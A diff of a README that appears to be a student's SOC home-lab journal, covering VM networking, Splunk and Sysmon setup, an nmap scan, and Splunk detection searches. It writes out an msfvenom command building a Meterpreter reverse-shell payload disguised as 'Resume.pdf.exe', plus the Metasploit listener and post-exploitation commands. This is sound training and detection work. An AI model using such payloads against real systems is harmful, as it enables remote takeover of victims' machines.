@@ -5,80 +5,198 @@ This is a "journal entry" of my process creating my first SOC home lab. My purpo
 
 ---
 
-## Homelab Enviornment Baseline
+# SOC Home Lab — Malware Analysis & Detection
+
+## Environment Baseline
 - **Hypervisor:** VMware
-- **SIEM:** Splunk
-- **Endpoints:** Windows 10, Kali Linux Server
+- **SIEM:** Splunk 10.2.1
+- **Endpoints:** Windows 11, Kali Linux
 
 ---
 
 ## Baseline Setup
-**Date** January 21, 2026
-- I installed win10 onto my VM. During the installation process I opted for a Local Account via the Offline Account/ Limited Experience path.
+**Date:** January 21, 2026
 
-**Logic:** I figured it would provide a cleaner lab enviroment for me. It'll reduce any Microsoft cloud sync services logs or anything related.
+I installed Windows 11 onto my VM. During the installation process I opted for a Local Account via the Offline Account/Limited Experience path. This provides a cleaner lab environment by reducing Microsoft cloud sync services and related background noise in logs.
 
-- I wanted to confirm that my offline account was already an admin for my own peace of mind by entering the command 'net user %username%'. (It was).
+I confirmed administrator privileges by running:
+```
+net user %username%
+```
 
----
-
-
-
-
-## Troubleshooting
-
-**Issue**
-- Pinging my win10 machine from my kali machine didn't work.
-- I went into my win10 machine to try pinging my kali machine.
-- I believe the firewall on the win10 machine blocked incoming traffic from the Kali machine because Kali was successfully pinged from there.
+[SCREENSHOT: Command prompt showing net user output confirming admin status]
 
 ---
 
-## Configuration
+## Network Configuration
 
--I jumped into the VM settings and created a new LAN segment. I named it "test"
-I found a list online of safe network options for specific use cases.
--NAT:  Access to Internet: Yes Use case: Test Tools
-- NAT Network:  Access to Internet: Yes  Use case: Test Tools
-- Bridged:  Access to Internet: Yes  Use case: Test Tools
-- Host-Only: Access to Internet: No  Use case: Analyze Malware
-- Internal Net:  Access to Internet: No  Use Case: Analyze Malware
-- Not Attached:  Access to Internet: No  Use Case: Analyze Malware
+I created a LAN segment in VMware named "LabNetwork" to isolate the lab environment from my host machine and the internet.
 
--I then moved to statically assigning IP addresses to both machines so that they can communicate with eachother.
+| Network Mode | Internet Access | Use Case |
+|---|---|---|
+| NAT | Yes | Testing tools |
+| Bridged | Yes | Testing tools |
+| Host-Only | No | Malware analysis |
+| LAN Segment | No | Isolated lab communication |
 
-**Assigning IP addresses**
+**Windows 11 — 192.168.20.10**
+1. Opened Network & Internet Settings
+2. Navigated to Change Adapter Options
+3. Right-clicked Ethernet0 → Properties → IPv4 → Properties
+4. Assigned static IP: 192.168.20.10, Subnet Mask: 255.255.255.0
+5. Confirmed with ipconfig
 
-**Win10**
-- I started with my win10 machine first.
-  1. I opened up the internet & network settings
-  2. Scrolled down to change adapter options
-  3. Right clicked Ethernet0, chose properties, looked for IPv4, selected and clicked properties. It brought me to the general properties tab where I was then able to statically assign the IP address. I assigned the IP address of 192.168.20.10 and left the subnet mask at 255.255.255.0
-  4. I opened up command prompt to check to if the IP address was successfully assigned using "ipconfig". (It was successfully assigned)
+[SCREENSHOT: ipconfig output showing 192.168.20.10]
 
-**Kali**
-- I right clicked the ethernet symbol, and chose edit connections.
-  1. I clicked the IPv4 settings tab
-  2. I changed the method of automatic DCHP to Manual
-  3. I assigned the IP address to 192.168.20.11
-  4. I opened up the terminal and ran 'ifconfig' to again confirm that the IP address was successfully assigned (It was successfully assigned)
- 
-- After assigning both machines IP addresses successfully, I pinged the win10 machine from the Kali one.
+**Kali Linux — 192.168.20.11**
+1. Right-clicked ethernet icon → Edit Connections
+2. Navigated to IPv4 Settings tab
+3. Changed method from Automatic DHCP to Manual
+4. Assigned static IP: 192.168.20.11, Subnet Mask: 255.255.255.0
+5. Confirmed with ifconfig
 
-**Issue**
-- Pinging my win10 machine from my kali machine didn't work.
-- I went into my win10 machine to try pinging my kali machine.
-- I believe the firewall on the win10 machine blocked incoming traffic from the Kali machine because Kali was successfully pinged from there.
+[SCREENSHOT: ifconfig output showing 192.168.20.11]
 
-- I am now done with configuration with the intention of protecting my host machine while executing and sending malicious attacks from my Kali machine to my win10 machine.
+**Troubleshooting: Ping Failures**
 
-**Logic:** I want to reduce the risk of compromising my host machine while executing and sending malicious attacks to my win10 machine.
+Initial pings failed due to Windows Firewall blocking ICMP traffic. Resolved by running:
+```
+New-NetFirewallRule -DisplayName "Allow ICMPv4" -Protocol ICMPv4 -IcmpType 8 -Enabled True -Action Allow
+```
 
+[SCREENSHOT: Successful ping from Kali to Windows 11]
 
-**Installing Kali as the Attacker's Machine:**
-- I noticed that the download file for Kali was a 7 zip file extension, so i had to download it.
+---
 
+## Installing Splunk
 
-**Installing Splunk on my Windows Machine:**
-- After the installation process and setting things up, my first action was to generate some data on my environment.
-- I clicked monitor, local event logs, and for the log events i chose: Application, Security, and System.
+After installation I configured Splunk to ingest Windows Event Logs via Add Data → Monitor → Local Event Logs and selected Application, Security, and System.
+
+[SCREENSHOT: Splunk Add Data review screen showing Application, Security, System selected]
+
+---
+
+## Installing Sysmon
+
+To enrich endpoint logging I installed Sysmon using the SwiftOnSecurity configuration for detailed visibility into process creation, network connections, and file activity.
+```
+.\Sysmon64.exe -accepteula -i sysmonconfig.xml
+```
+
+[SCREENSHOT: PowerShell showing Sysmon64 service running]
+
+---
+
+## Reconnaissance — Nmap Scan
+
+From Kali I ran an aggressive scan against the Windows 11 target:
+```
+nmap -A 192.168.20.10 -Pn
+```
+
+Open ports discovered:
+- 135 — Microsoft RPC
+- 139 — NetBIOS
+- 445 — SMB
+- 3389 — RDP
+- 8000/8089 — Splunk
+
+The -A flag enables aggressive scanning including OS detection and service versioning. The -Pn flag skips host discovery.
+
+[SCREENSHOT: Nmap scan results showing open ports]
+
+---
+
+## Enabling RDP
+
+Enabled Remote Desktop on Windows 11 via Settings → System → Remote Desktop.
+
+[SCREENSHOT: Windows 11 Remote Desktop settings showing RDP enabled on port 3389]
+
+---
+
+## Generating Malware with Msfvenom
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe
+```
+
+- -p windows/x64/meterpreter_reverse_tcp — Meterpreter reverse TCP payload
+- LHOST=192.168.20.11 — payload calls back to the Kali machine
+- LPORT=4444 — listening port
+- -f exe — outputs as a Windows executable
+- -o Resume.pdf.exe — filename mimics a PDF to simulate social engineering
+
+Note: Windows Defender was disabled for the purpose of generating telemetry in this lab environment.
+
+[SCREENSHOT: Msfvenom command output showing payload generated]
+
+---
+
+## Setting Up the Metasploit Listener
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.20.11
+set lport 4444
+run
+```
+
+[SCREENSHOT: Metasploit handler running and waiting for connection]
+
+---
+
+## Executing the Payload
+
+The payload was transferred to the Windows 11 machine and executed. With file extensions hidden the file appears to be a PDF, which is a common social engineering technique. After enabling file extensions the .exe extension becomes visible.
+
+I confirmed the connection by running:
+```
+netstat -anob
+```
+
+I located an established connection back to the Kali machine on port 4444.
+
+[SCREENSHOT: netstat output showing established connection to 192.168.20.11:4444]
+
+---
+
+## Post-Exploitation
+
+After a Meterpreter session was established I dropped into a shell and ran:
+```
+shell
+net user
+net localgroup
+ipconfig
+```
+
+[SCREENSHOT: Kali terminal showing Meterpreter session and post-exploitation commands]
+
+---
+
+## Detection in Splunk
+
+I created a dedicated index called endpoint to ingest Sysmon data and searched for evidence of the attack.
+
+Searching for malware execution:
+```
+index=endpoint Resume.pdf.exe
+```
+
+[SCREENSHOT: Splunk results showing Resume.pdf.exe execution]
+
+Pivoting on process GUID to trace activity:
+```
+index=endpoint {process_guid}
+| table _time, ParentImage, Image, CommandLine
+```
+
+This revealed explorer.exe spawning Resume.pdf.exe, a classic indicator of a user executing a malicious file.
+
+[SCREENSHOT: Splunk table showing ParentImage, Image, and CommandLine]
+
+---
+
+## Conclusion
+
+This project gave me hands-on experience with both offensive and defensive security. On the blue team side I configured a SIEM, ingested endpoint telemetry, and identified malicious activity through log analysis. On the red team side I used Nmap, Msfvenom, and Metasploit to simulate a realistic attack chain. The combination of both perspectives deepened my understanding of how attacks are executed and how defenders can detect them.
